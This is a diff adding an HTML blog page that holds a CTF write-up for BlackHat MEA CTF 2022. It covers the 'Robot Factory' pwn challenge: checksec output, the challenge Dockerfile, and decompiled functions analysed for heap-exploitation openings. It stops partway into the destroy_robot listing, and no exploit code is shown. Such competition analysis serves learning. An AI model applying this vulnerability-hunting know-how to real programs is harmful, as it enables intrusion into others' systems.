@@ -1,0 +1,1470 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <title>BlackHat MEA CTF 2022 | Welcome to Chovid99&#39;s Blog</title>
+
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width,minimum-scale=1">
+<meta property="og:title" content="BlackHat MEA CTF 2022" />
+<meta property="og:description" content="Writeup for BlackHAt MEA CTF 2022 by Chovid99" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chovid99.github.io/posts/blackhat-mea-ctf-2022/" /><meta property="og:image" content="https://chovid99.github.io/site-feature-image.jpeg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-02T02:53:04+07:00" />
+<meta property="article:modified_time" content="2022-10-02T02:53:04+07:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image:src" content="https://chovid99.github.io/site-feature-image.jpeg"/>
+
+<meta name="twitter:title" content="BlackHat MEA CTF 2022"/>
+<meta name="twitter:description" content="Writeup for BlackHAt MEA CTF 2022 by Chovid99"/>
+<meta name="twitter:site" content="@Chovid99"/>
+<meta name="twitter:creator" content="@Chovid99"/>
+<meta property="og:site_name" content="Chovid99's Blog">
+
+<meta name="generator" content="Hugo 0.95.0" />
+
+
+  <META NAME="ROBOTS" CONTENT="INDEX, FOLLOW">
+
+
+<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/tocbot.css">
+
+
+
+<link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-19HP521HQ9');
+  </script>
+
+
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css" integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js" integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js" integrity="sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl" crossorigin="anonymous"
+    onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '\\[', right: '\\[', display: true}, {left: '$', right: '$', display: false}, {left: '\\(', right: '\\)', display: false}]});"></script>
+
+
+
+
+
+
+  </head>
+
+  <body>
+    <nav class="navigation">
+	
+		<a href="/"> <span class="arrow">←</span>Home</a>
+	
+	<a href="/posts">Posts</a>
+	<a href="/tags">Tags</a>
+	<a href="/about">About</a>
+
+	
+
+	
+</nav>
+
+
+    <main class="main">
+      
+
+<section id="single">
+    <h1 class="title">BlackHat MEA CTF 2022</h1>
+
+    <div class="tip">
+        <time datetime="2022-10-02 02:53:04 &#43;0700 WIB">Oct 2, 2022</time>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          4304 words
+        </span>
+        <span class="split">
+          ·
+        </span>
+        <span>
+          21 minute read
+        </span>
+    </div>
+
+    <div class="content">
+      <div class="post-content js-toc-content">
+        <p><p class="markdown-image">
+  <img src="https://i.imgur.com/K113qox.png" alt=""  />
+</p>
+<p class="markdown-image">
+  <img src="https://i.imgur.com/K0qujV8.png" alt=""  />
+</p></p>
+<p>During this weekend, I played BlackHat MEA CTF 2022 with my team <code>Fidethus</code>. We managed to secure the 12th position on this CTF. Here are some of my write-ups for challenges that I solved during the CTF.</p>
+<h1 id="pwn">pwn <a href="#pwn" class="anchor">#</a></h1>
+<h2 id="robot-factory">Robot Factory <a href="#robot-factory" class="anchor">#</a></h2>
+<h3 id="initial-analysis">Initial Analysis <a href="#initial-analysis" class="anchor">#</a></h3>
+<p>Let&rsquo;s start by checking the binary via <code>checksec</code>.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    Canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE (0x400000)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, so the binary is No PIE and Partial RELRO. This will help a lot! Now, let&rsquo;s check the given Dockerfile</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>FROM ubuntu:18.04
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RUN apt-get update &amp;&amp; apt-get -y upgrade
+</span></span><span style="display:flex;"><span>RUN useradd -d /home/task/ -m -p task -s /bin/bash task
+</span></span><span style="display:flex;"><span>RUN echo &#34;task:task&#34; | chpasswd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>WORKDIR /home/task
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>COPY main .
+</span></span><span style="display:flex;"><span>COPY flag.txt .
+</span></span><span style="display:flex;"><span>COPY ynetd .
+</span></span><span style="display:flex;"><span>COPY run.sh .
+</span></span><span style="display:flex;"><span>RUN chown -R root:root /home/task
+</span></span><span style="display:flex;"><span>RUN chmod 755 ynetd
+</span></span><span style="display:flex;"><span>RUN chmod 755 main
+</span></span><span style="display:flex;"><span>RUN chmod 777 flag.txt
+</span></span><span style="display:flex;"><span>RUN chmod 755 run.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>USER task
+</span></span><span style="display:flex;"><span>CMD [&#34;./run.sh&#34;]
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Okay, so the challenge is running in Ubuntu 18.04, and it uses <code>libc-2.27</code> as the glibc version. Now, let&rsquo;s try to analyze the binary by disassembling it.</p>
+<p><strong>robots_factory</strong></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>undefined8 <span style="color:#c0f">robots_factory</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Welcome to the secret robots factory!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span>( <span style="color:#366">true</span> ) {
+</span></span><span style="display:flex;"><span>    menu();
+</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#555">=</span> read_int();
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">4</span>) <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">&lt;</span> <span style="color:#f60">5</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">3</span>) {
+</span></span><span style="display:flex;"><span>        destroy_robot();
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">&lt;</span> <span style="color:#f60">4</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>          new_robot();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">==</span> <span style="color:#f60">2</span>) {
+</span></span><span style="display:flex;"><span>          program_robot();
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see that the binary only gave us 3 menus, new, program, and destroy. Let&rsquo;s check those methods.</p>
+<p><strong>new_robot</strong></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">new_robot</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>pvVar2;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  uint local_20;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_15 [<span style="color:#f60">5</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (number_robots <span style="color:#555">&lt;</span> <span style="color:#f60">5</span>) {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Provide robot memory size:&#34;</span>);
+</span></span><span style="display:flex;"><span>    read(<span style="color:#f60">0</span>,local_15,<span style="color:#f60">4</span>);
+</span></span><span style="display:flex;"><span>    iVar1 <span style="color:#555">=</span> atoi(local_15);
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (iVar1 <span style="color:#555">&lt;</span> <span style="color:#f60">0x101</span>) {
+</span></span><span style="display:flex;"><span>      puts(<span style="color:#c30">&#34;you</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">re creating a stupid robot.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#069;font-weight:bold">for</span> (local_20 <span style="color:#555">=</span> <span style="color:#f60">0</span>; (<span style="color:#078;font-weight:bold">int</span>)local_20 <span style="color:#555">&lt;</span> <span style="color:#f60">5</span>; local_20 <span style="color:#555">=</span> local_20 <span style="color:#555">+</span> <span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">int</span> <span style="color:#555">*</span>)(check_robot_slot <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)local_20 <span style="color:#555">*</span> <span style="color:#f60">4</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
+</span></span><span style="display:flex;"><span>          pvVar2 <span style="color:#555">=</span> calloc(<span style="color:#f60">1</span>,(<span style="color:#078;font-weight:bold">long</span>)iVar1);
+</span></span><span style="display:flex;"><span>          <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(robots <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)local_20 <span style="color:#555">*</span> <span style="color:#f60">8</span>) <span style="color:#555">=</span> pvVar2;
+</span></span><span style="display:flex;"><span>          <span style="color:#555">*</span>(undefined4 <span style="color:#555">*</span>)(check_robot_slot <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)local_20 <span style="color:#555">*</span> <span style="color:#f60">4</span>) <span style="color:#555">=</span> <span style="color:#f60">1</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">int</span> <span style="color:#555">*</span>)(robot_memory_size <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)(<span style="color:#078;font-weight:bold">int</span>)local_20 <span style="color:#555">*</span> <span style="color:#f60">4</span>) <span style="color:#555">=</span> iVar1;
+</span></span><span style="display:flex;"><span>          printf(<span style="color:#c30">&#34;You got new page at index %d</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,(ulong)local_20);
+</span></span><span style="display:flex;"><span>          number_robots <span style="color:#555">=</span> number_robots <span style="color:#555">+</span> <span style="color:#f60">1</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#069;font-weight:bold">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;All slots are occupied :(&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can notice some interesting notes from that method:</p>
+<ul>
+<li>The max size of the total active allocated chunks is only 5</li>
+<li>We can only allocate chunks with size larger than 0x101, and based on the <code>atoi</code> method, the size is limited to 4 digits (which means the max value is <code>9999</code>)</li>
+<li>Instead of <code>malloc</code>, it uses <code>calloc</code>. We will discuss the key differences later.</li>
+<li>The allocated chunk (we call it as <code>robot</code>) address is stored in global variable <code>robots</code></li>
+<li>The size of the <code>robot</code> is also stored in a global variable called <code>robot_memory_size</code>.</li>
+<li>There is also a global variable called <code>check_robot_slot</code> which will be assigned to <code>1</code> if we create a new <code>robot</code></li>
+<li>There&rsquo;s also <code>number_robots</code> global variable, which will count how many <code>robot</code> we&rsquo;ve created.</li>
+</ul>
+<p>So far, we didn&rsquo;t see any bugs. Let&rsquo;s move to the other methods.</p>
+<p><strong>destroy_robot</strong></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
